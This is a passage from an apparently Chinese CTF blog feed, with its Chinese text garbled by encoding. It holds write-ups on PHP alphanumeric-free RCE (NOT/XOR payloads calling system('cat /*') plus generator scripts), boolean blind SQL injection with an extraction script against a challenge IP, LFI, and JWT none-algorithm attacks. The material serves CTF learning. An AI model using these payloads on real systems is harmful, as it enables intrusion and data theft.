class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">logLine</span>(<span class="hljs-string">&quot;meta&quot;</span>, <span class="hljs-string">&quot;NOTE: verification runs on server-side (salt not available on client)&quot;</span>);<br><span class="hljs-title function_">logLine</span>(<span class="hljs-string">&quot;warn&quot;</span>, <span class="hljs-string">&quot;HINT: after mains cut, device may enter battery mode; repeated attempts drain battery&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä½†<strong>å‰ç«¯æ•…æ„å¼±åŒ–äº†è€—ç”µæ•ˆæœ</strong>ï¼Œè®©ä½ ä»¥ä¸ºâ€œåˆ· 100 æ¬¡å°±è¡Œâ€ï¼Œå®é™…ä¸Šï¼š</p><ul><li>åç«¯æ¯æ¬¡æ‰£ 5%ï¼Œ20 æ¬¡å°±å…³æœº</li><li>å‰ç«¯è¦åˆ· 100 æ¬¡æ‰æ˜¾ç¤ºå…³æœºï¼Œä½†æ­¤æ—¶åç«¯æ—©å°±å…³æœºäº†</li><li>è€Œä¸”å‰ç«¯æ¢å¤ç”µæºæ—¶ç›´æ¥æ»¡ç”µï¼Œ<strong>è·³è¿‡äº†é‡ç½®æ¡ä»¶</strong></li></ul><blockquote><p>ğŸ¯ æ‰€ä»¥æ­£ç¡®åšæ³•æ˜¯ï¼š<strong>ä¸è¦ç”¨å‰ç«¯ UI æ“ä½œï¼Œç›´æ¥è°ƒç”¨ API</strong></p></blockquote><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™é“é¢˜ä¸çœ‹wpå¾ˆéš¾åšå‡ºæ¥</p><ul><li>åˆ†æjsä»£ç æ‰¾åˆ°å‰åç«¯éªŒè¯æœºåˆ¶åŒºåˆ«</li><li>æ‰¾åˆ°éšè—çš„&#x2F;api&#x2F;power</li><li>æ ¹æ®jsonåˆ†æå‡ºCRC16ç­¾å</li><li>ç®¡ç†å‘˜å¡</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµ…è°ˆæ— å­—æ¯æ•°å­—RCE</title>
    <link href="/2026/01/07/%E6%B5%85%E8%B0%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/"/>
    <url>/2026/01/07/%E6%B5%85%E8%B0%88%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="å¼•å­"><a href="#å¼•å­" class="headerlink" title="å¼•å­"></a>å¼•å­</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Pr0&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$Pr0</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æˆ‘ä¸å–œæ¬¢å­—æ¯å’Œæ•°å­—ï¼ï¼ï¼&quot;</span>);<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$Pr0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="urlå–åç»•è¿‡ï¼ˆPHP7ï¼‰"><a href="#urlå–åç»•è¿‡ï¼ˆPHP7ï¼‰" class="headerlink" title="urlå–åç»•è¿‡ï¼ˆPHP7ï¼‰"></a>urlå–åç»•è¿‡ï¼ˆPHP7ï¼‰</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;system&#x27;</span>);<span class="hljs-comment">//%8C%86%8C%8B%9A%92</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;cat /*&#x27;</span>);<span class="hljs-comment">//%9C%9E%8B%DF%D0%D5</span><br></code></pre></td></tr></table></figure><p><strong>æŒ‰ä½å–å</strong> æ˜¯å°†ä¸€ä¸ªæ•°çš„æ¯ä¸€ä½äºŒè¿›åˆ¶ä½ 0 å˜ 1ã€1 å˜ 0</p><p>å­—ç¬¦ä¸²å–ååå˜æˆä¸å¯æ‰“å°å­—ç¬¦ï¼Œä½†å¯ä»¥è¿›è¡Œurlç¼–ç ï¼Œä»¥æ­¤ç»•è¿‡è¿‡æ»¤</p><p>ä½†æ˜¯è¿™é‡Œå…³é”®çš„æ˜¯payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?Pr0=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%D5); <br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä»€ä¹ˆåé¢çš„å‚æ•°ä¸éœ€è¦ç”¨æ‹¬å·å’Œå¼•å·åŒ…è£¹ï¼Œè‡ªå·±åŠ ä¸Šåè€Œå‡ºé”™ï¼Ÿ</p><p>payloadç»è¿‡urlè§£ç ä»¥åŠå–ååå˜æˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-string">&quot;system&quot;</span>)(<span class="hljs-string">&quot;cat /*&quot;</span>);<br></code></pre></td></tr></table></figure><p>åœ¨ PHP ä¸­ï¼Œ<strong>å¦‚æœä¸€ä¸ªå˜é‡çš„å€¼æ˜¯å­—ç¬¦ä¸²ï¼Œä¸”è¯¥å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªå·²å­˜åœ¨çš„å‡½æ•°åï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ <code>$func()</code> çš„æ–¹å¼è°ƒç”¨å®ƒ</strong>ï¼Œæ‰€ä»¥ä¸Šé¢çš„ä»£ç å®Œå…¨åˆæ³•ã€‚</p><p>è€Œè‡ªå·±æ‰‹åŠ¨åŠ ä¸ŠåŒå¼•å·ï¼Œç»è§£ç åå˜ä¸º</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(ï½<span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>8C<span class="hljs-char escape_">\x</span>86<span class="hljs-char escape_">\x</span>8C<span class="hljs-char escape_">\x</span>8B<span class="hljs-char escape_">\x</span>9A<span class="hljs-char escape_">\x</span>92&quot;</span>)(<span class="hljs-string">&quot;ï½&quot;</span>\x9C\x9E\x8B\xDF\xD0\xD5<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>åé¢çš„~è¿ç®—å˜æˆäº†å­—ç¬¦ä¸²ï¼Œä¸ä¼šè¿›è¡Œå–åæ“ä½œï¼</p><h2 id="å¼‚æˆ–ç»•è¿‡"><a href="#å¼‚æˆ–ç»•è¿‡" class="headerlink" title="å¼‚æˆ–ç»•è¿‡"></a>å¼‚æˆ–ç»•è¿‡</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›ä¸å¯è§å­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—å¾—åˆ°æˆ‘ä»¬çš„å­—æ¯ï¼ˆä¾‹å¦‚s&#x3D;urldecode(%08)^urldecode(%7b)ï¼‰</p><p>å…ˆç”Ÿæˆä¸€ä¸ªå­—å…¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br> <br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>å†ç”Ÿæˆpayload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your commandï¼š&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/695f05c0c1cee4b048c6a9ad.png"></p><p>è¿˜æœ‰ä¸¤ç§payload</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">?Pr0=(%27%0C%06%0C%0B%1A%12%27^%27%7F%7F%7F%7F%7F%7F%27)($&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;);&amp;%A0=cat%20<span class="hljs-comment">/*</span><br><span class="hljs-comment">//system(_GET[...]);</span><br></code></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">?Pr0=$<span class="hljs-symbol">_</span>=<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$<span class="hljs-symbol">_</span>&#125;[<span class="hljs-symbol">_</span>]($&#123;$<span class="hljs-symbol">_</span>&#125;[<span class="hljs-symbol">__</span>]);&amp;<span class="hljs-symbol">_</span>=<span class="hljs-built_in">system</span>&amp;<span class="hljs-symbol">__</span>=cat%<span class="hljs-number">20</span><span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><h2 id="é•¿åº¦é™åˆ¶"><a href="#é•¿åº¦é™åˆ¶" class="headerlink" title="é•¿åº¦é™åˆ¶"></a>é•¿åº¦é™åˆ¶</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">//flag in flag.php</span><br><br><span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c2n_y2u c@ptu3e.+the[f!a&amp;?&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>, <span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>) &gt; <span class="hljs-number">14</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;toooooo looooog!&quot;</span>);<br>&#125;<br><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡çŒ®åŠå…¶ä»–æ–¹æ³•"><a href="#å‚è€ƒæ–‡çŒ®åŠå…¶ä»–æ–¹æ³•" class="headerlink" title="å‚è€ƒæ–‡çŒ®åŠå…¶ä»–æ–¹æ³•"></a>å‚è€ƒæ–‡çŒ®åŠå…¶ä»–æ–¹æ³•</h2><p><a href="https://err0r233.github.io/posts/47468.html">ç®€å•çœ‹çœ‹æ— å­—æ¯æ•°å­—RCE</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åˆ·é¢˜æ—¥è®°</title>
    <link href="/2026/01/04/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/"/>
    <url>/2026/01/04/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="error-sql"><a href="#error-sql" class="headerlink" title="error_sql"></a>error_sql</h2><p>æœ¬æ¥çœ‹äº†æè¿°è¿˜ä»¥ä¸ºæ˜¯æŠ¥é”™æ³¨å…¥ç»“æœè¿›å»æ‰å‘ç°åªå›æ˜¾æ˜¯å¦æŸ¥è¯¢æˆåŠŸï¼Œå…¸å‹çš„å¸ƒå°”ç›²æ³¨</p><p>å¸å–ä¸Šæ¬¡çš„æ•™è®­å…ˆæµ‹ä¸€ä¸‹WAFï¼Œæ²¡æœ‰</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and length(database())=<span class="hljs-number">10</span> and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ç¡®å®šæ•°æ®åº“åé•¿åº¦</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;t&#x27; and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>çˆ†æ•°æ®åº“å terra_data</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">substr</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure><p>çˆ†è¡¨å secret</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">substr</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema</span>=database() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;secret&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;i&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µå flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://124.221.168.69:20328/search&#x27;</span><br>str_range = <span class="hljs-string">&#x27;&#125;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br>headers = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJzdW4ifQ.aWM0dw.jbcwlk8_tGVJkxk2aIVqJXRFhVc&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getData</span>(<span class="hljs-params">str_list</span>):<br>    j = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str_list:<br>            new_url = url + <span class="hljs-string">f&quot;?id=1&#x27; and substr((select group_concat(flag) from secret),<span class="hljs-subst">&#123;j&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27; and &#x27;1&#x27;=&#x27;1&quot;</span><br>            r = requests.get(new_url,headers=headers)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;æˆåŠŸæŸ¥è¯¢&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                <span class="hljs-built_in">print</span>(i, end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&#125;&quot;</span>:<br>                    <span class="hljs-built_in">print</span>()<br>                    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        j = j + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getData(str_range)<br></code></pre></td></tr></table></figure><p>è„šæœ¬çˆ†flag</p><h2 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI_2_?"></a>LFI_2_?</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">//read file only :)</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æè¿°ï¼šallow_url_include Off</p><p>è¿™é‡Œæˆ‘ä»¬å¤ä¹ ä¸€ä¸‹</p><p>å¯¹includeè€Œè¨€ï¼Œå®ƒä¼šåŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ä¸­çš„ä»£ç ï¼Œå¹¶ä¸”php:&#x2F;&#x2F;inputå’Œdata:&#x2F;&#x2F;ä¾èµ–allow_url_include On</p><p>è€Œfile_get_contentsï¼Œå®ƒåªæ˜¯ä¸€ä¸ªâ€œæ•°æ®æ¬è¿å·¥â€ï¼Œä¸ä¼šè§£ææˆ–æ‰§è¡Œå…¶ä¸­çš„PHPä»£ç ï¼Œå¹¶ä¸”php:&#x2F;&#x2F;inputå’Œdata:&#x2F;&#x2F;ä¾èµ–allow_url_fopen On</p><h3 id="æ—¥å¿—åŒ…å«"><a href="#æ—¥å¿—åŒ…å«" class="headerlink" title="æ—¥å¿—åŒ…å«"></a>æ—¥å¿—åŒ…å«</h3><p><img src="https://pic1.imgdb.cn/item/69634f1b75db907620f2687a.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JWTè¯¦è§£</title>
    <link href="/2025/12/29/JWT%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/12/29/JWT%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="å‚è€ƒçŸ¥è¯†"><a href="#å‚è€ƒçŸ¥è¯†" class="headerlink" title="å‚è€ƒçŸ¥è¯†"></a>å‚è€ƒçŸ¥è¯†</h3><p><a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">JWTåŸºç¡€çŸ¥è¯†</a></p><p><a href="https://www.cnblogs.com/xinghaihe/p/19083689">JWT CTFå®æˆ˜</a></p><h3 id="PCTF-Jwt-password-manager"><a href="#PCTF-Jwt-password-manager" class="headerlink" title="[PCTF] Jwt_password_manager"></a>[PCTF] Jwt_password_manager</h3><p> é¢˜ç›®æç¤ºä»ªè¡¨ç›˜æ”¯æŒjwtè®¤è¯ï¼Œä»£ç å‘ç°æç¤ºflagåœ¨adminç”¨æˆ·ä¸­</p><p>å…ˆæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·æ‹¿åˆ°tokenï¼Œå†ç»“åˆsecret_keyä¿®æ”¹æƒé™</p><p><img src="https://pic1.imgdb.cn/item/69586e0f912e73dbe6128973.png"></p><p>ä¿®æ”¹tokenæ‹¿åˆ°flag</p><p><img src="https://pic1.imgdb.cn/item/69586e23912e73dbe6128977.png"></p><h3 id="BaseCTF2024-NO-JWT"><a href="#BaseCTF2024-NO-JWT" class="headerlink" title="[BaseCTF2024] NO JWT"></a>[BaseCTF2024] NO JWT</h3><p>é¦–å…ˆå®¡è®¡ä»£ç ï¼Œå‘ç°&#x2F;loginå’Œ&#x2F;flagè·¯å¾„</p><p>æ‰“å¼€&#x2F;flagå‘ç°è¦æ ¡éªŒèº«ä»½ï¼Œé‚£å°±å…ˆå»&#x2F;loginè·å–ä»¤ç‰Œï¼Œæ ¹æ®æç¤ºéšä¾¿ä¼ å…¥ä¸€ä¸ªjson</p><p><img src="https://pic1.imgdb.cn/item/69587856912e73dbe6128c46.png"></p><p>ä»£ç ä¸­æ²¡æœ‰secret_keyï¼Œä½†æ˜¯åœ¨åé¢ä¹Ÿæ²¡æœ‰æ ¡éªŒç­¾åï¼Œæ‰€ä»¥é‡‡ç”¨noneæ”»å‡»</p><p><img 